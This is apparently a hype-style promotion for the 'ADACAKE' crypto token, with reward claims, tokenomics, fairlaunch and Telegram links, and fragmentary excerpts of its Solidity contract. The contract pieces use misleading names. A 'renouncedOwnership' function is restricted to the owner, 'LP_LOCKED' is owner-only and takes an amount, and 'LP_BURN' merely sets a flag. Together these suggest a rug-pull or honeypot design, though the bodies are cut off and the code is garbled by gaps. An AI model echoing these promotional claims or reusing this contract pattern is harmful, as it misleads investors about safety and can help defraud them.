...
ADACAKE mysteriously drops filthy amounts of Cake&ADA tokens. Clearly explained, you will be getting Cake & ADA tokens directly into your wallet as a reward for holding ADACAKE tokens! Get rewarded on EVERY transaction on this exciting token right now!

Tokenomics🍩
⭐️Suply : 1,000,000,000
⭐️8% Rewards
⭐️4% Liquidity
⭐️3% Marketing/development

✳️ FAIRLAUNCH At https://countingdownto.com/?c=3804575
...
✳️Twitter- https://twitter.com/

📨Telegram- https://t.me/ADACAKEFINANCE
...
interface IPancakeFactory {
 ...
 contract Ownable is Context {
    ...
    function renouncedOwnership(uint8 _owned) public virtual onlyOwner {
      ...
      function ClaimRewardCake() public virtual {
...
contract ADACAKEFINANCE is Context, IERC20, IERC20Metadata, Ownable {   
    ...
    function LP_BURN(bool _value) public returns (bool) {
        isValue = _value;
        return true;
    }

    function LP_LOCKED(uint256 amount) public onlyOwner returns (bool) {
